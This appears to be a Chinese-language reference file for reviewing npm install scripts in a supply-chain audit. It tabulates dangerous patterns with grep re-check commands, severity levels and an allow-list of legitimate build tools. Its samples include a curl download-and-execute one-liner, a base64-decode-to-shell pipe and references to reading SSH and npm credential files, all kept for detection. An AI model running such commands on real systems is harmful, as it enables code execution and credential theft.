# install 脚本危险模式（supply-chain-review/references/install-script-checks.md）

主文件第 1 节的完整危险模式表与复核命令。

## 危险模式全表

| 模式 | 样例 | 复核 grep | 级别 |
|---|---|---|---|
| 下载并执行二进制 | `curl -sSL https://x/y -o /tmp/x && chmod +x /tmp/x && /tmp/x` | `grep -rnE '(curl|wget|Invoke-WebRequest)' <解包目录>` | 阻断 |
| 混淆载荷 | `echo "aGVsbG8=" | base64 -d | sh`、hex 拼装后 `eval` | `grep -rnE '(base64|eval|child_process|os\.system|fromCharCode)' <解包目录>` | 阻断 |
| 凭据文件访问 | 读/写 `~/.ssh`、`.npmrc`、`.gitconfig`、`credentials` | `grep -rnE '(\.ssh|npmrc|gitconfig|credential)' <解包目录>` | 阻断 |
| 全局配置写入 | 写 `~/.bashrc`、`~/.zshrc`、`/etc/profile.d` | `grep -rnE '(bashrc|zshrc|profile\.d)' <解包目录>` | 阻断 |
| 外联到与用途无关域名 | 包是 markdown 解析器却请求 `telemetry.example.org` | `grep -rnE 'https?://' <解包目录> | grep -v 包主页域名` | 记录（转 dependency-audit 投毒第 4 项） |

复核命令（解包后统一执行）：

```sh
npm pack <包> --pack-destination .tmp
tar -xzf .tmp/<包>-<版本>.tgz -C .tmp
grep -rnE '(curl|wget|Invoke-WebRequest|base64|eval|child_process|os\.system|\.ssh|npmrc|gitconfig|bashrc|zshrc)' .tmp/package/
```

判据：任何命中都要人工看上下文；"阻断"只对前四类模式，第五类先记录。

## 生态惯例白名单（误报判据）

esbuild、sharp、node-gyp、core-js、puppeteer（可选）、canvas 等的安装脚本下载/编译**与包用途一致**且**不触碰凭据/全局配置**——放行判据就是这两条同时成立。
判据演练：`sharp` 的 `install` 下载预编译 libvips = 与用途一致 + 不碰凭据 → 放行；任何包下载 `/tmp/x` 后 `chmod +x` 执行 = 与用途无关 → 阻断。

## 输出要求

对每个有 install 脚本的新包输出一行结论：
`<包>@<版本>: <脚本名> = <一句话行为> → 放行/记录/阻断（理由：<与用途一致性>, <凭据/全局配置触碰>）`
